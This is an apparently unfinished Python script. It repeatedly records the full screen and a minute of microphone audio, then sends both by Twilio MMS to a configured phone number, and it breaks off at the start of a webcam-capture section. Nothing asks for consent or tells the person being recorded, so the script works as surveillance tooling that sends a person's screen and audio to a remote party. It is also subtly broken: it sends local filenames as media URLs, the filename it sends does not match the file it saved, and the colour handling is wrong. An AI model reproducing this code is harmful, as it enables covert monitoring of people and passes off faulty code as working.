import cv2
import numpy as np
import time
import sys
import mss
import twilio
import pyaudio
import wave
from twilio.rest import Client

# Twilio account information
account_sid = "Your Account SID"
auth_token = "Your Auth Token"
client = Client(account_sid, auth_token)
to_number = "Your Phone Number"
from_number = "Your Twilio Number"

counter_webcam = 0
counter_screen = 0

def record_audio(filename):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    RECORD_SECONDS = 60
    WAVE_OUTPUT_FILENAME = filename
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)
    print("* recording")
    frames = []
    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)
    print("* done recording")
    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()

# Screen capture
with mss.mss() as sct:
    monitor = {"top": 0, "left": 0, "width": 1920, "height": 1080}
    while True:
        filename_screen = "screen_capture.mp4"
        screen_capture = cv2.VideoWriter(filename_screen, cv2.VideoWriter_fourcc(*"mp4v"), 30, (monitor["width"], monitor["height"]))
        audio_filename = "screen_capture.wav"
        
        start_time = time.time()
        while time.time() - start_time < 60:
            sct_img = sct.grab(monitor)
            frame = np.array(sct_img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2RGB)
            screen_capture.write(frame)
        
        screen_capture.release()
        counter_screen += 1
        filename_screen = "screen_capture ({}).mp4".format(counter_screen)
        record_audio(audio_filename)
        client.messages.create(to=to_number, from_=from_number, body="Screen Capture", media_url=[filename_screen, audio_filename])

# Webcam capture
cap = cv2.VideoCapture
